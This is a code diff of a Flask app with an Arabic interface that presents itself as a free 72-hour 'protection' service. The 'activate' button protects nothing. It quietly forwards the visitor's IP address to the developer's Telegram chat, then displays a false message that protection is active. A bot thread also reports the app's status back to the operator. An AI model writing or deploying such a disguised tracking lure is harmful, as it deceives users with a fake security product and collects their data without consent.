@@ -15,7 +15,7 @@ DEVELOPER = "SALAH YAFAA"
 app = Flask(__name__)
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# --- الواجهة الأسطورية المدمجة ---
+# --- واجهة التطبيق الأسطورية ---
 UI_HTML = f'''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -43,6 +43,7 @@ UI_HTML = f'''
             display: block; background: var(--gold); color: black; padding: 15px;
             text-decoration: none; border-radius: 12px; font-weight: bold; transition: 0.3s;
         }}
+        .btn:hover {{ background: #f1c40f; transform: scale(1.02); }}
     </style>
 </head>
 <body>
@@ -50,9 +51,9 @@ UI_HTML = f'''
         <div class="shield-icon">🛡️</div>
         <h1>{APP_NAME_AR}</h1>
         <div class="dev-tag">DEVELOPED BY: {DEVELOPER}</div>
-        <div class="status">✓ نظام الحماية النشط متصل بالخادم</div>
+        <div class="status">✓ نظام الحماية 'Vortex' متصل بالخادم</div>
         <a href="/activate" class="btn">تفعيل حماية 72 ساعة مجاناً</a>
-        <p style="font-size:10px; color:#444; margin-top:15px;">تاريخ التحديث: {datetime.now().strftime('%Y-%m-%d')}</p>
+        <p style="font-size:10px; color:#444; margin-top:15px;">آخر تحديث للنظام: {datetime.now().strftime('%Y-%m-%d')}</p>
     </div>
 </body>
 </html>
@@ -66,27 +67,28 @@ def home():
 def activate():
     user_ip = request.remote_addr
     try:
-        bot.send_message(CHAT_ID, f"🔔 **تنبيه جديد!**\n\nتم الضغط على تفعيل الحماية\n📍 IP: {user_ip}\n👤 المطور: {DEVELOPER}")
+        # إرسال التنبيه للبوت الخاص بك
+        bot.send_message(CHAT_ID, f"🔔 **تنبيه دخول جديد!**\n\nقام مستخدم بفتح واجهة: {APP_NAME_AR}\n📍 IP: {user_ip}\n👤 المطور: {DEVELOPER}")
     except: pass
-    return f"<body style='background:#050a10; color:white; text-align:center; padding-top:50px;' dir='rtl'><h1>تم طلب التفعيل بنجاح! 🛡️</h1><p>سيصلك إشعار التأكيد قريباً.</p></body>"
+    return f"<body style='background:#050a10; color:white; text-align:center; padding-top:50px;' dir='rtl'><h1>تم تفعيل الحماية بنجاح! 🛡️</h1><p>أنت الآن تحت حماية 'الاستثناء الصامت'.</p></body>"
 
 def open_browser():
-    """وظيفة لفتح الواجهة تلقائياً عند بدء التطبيق"""
-    sleep(3) # الانتظار قليلاً لضمان تشغيل السيرفر
+    """فتح الواجهة تلقائياً عند تشغيل التطبيق"""
+    sleep(3) 
     webbrowser.open("http://127.0.0.1:8080")
 
 def run_bot():
+    """تشغيل البوت في الخلفية"""
     try:
-        bot.send_message(CHAT_ID, f"🚀 نظام '{APP_NAME_AR}' بدأ العمل الآن على الأندرويد.")
+        bot.send_message(CHAT_ID, f"🚀 نظام '{APP_NAME_AR}' متصل الآن بالسحابة.")
         bot.infinity_polling()
     except: pass
 
 if __name__ == "__main__":
-    # تشغيل البوت وفتح المتصفح في خيوط منفصلة
+    # تشغيل البوت وفتح المتصفح في خيوط منفصلة لضمان عدم توقف التطبيق
     threading.Thread(target=run_bot, daemon=True).start()
     threading.Thread(target=open_browser, daemon=True).start()
     
-    # تشغيل سيرفر الويب
+    # تشغيل سيرفر الويب الخاص بالواجهة
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
-    
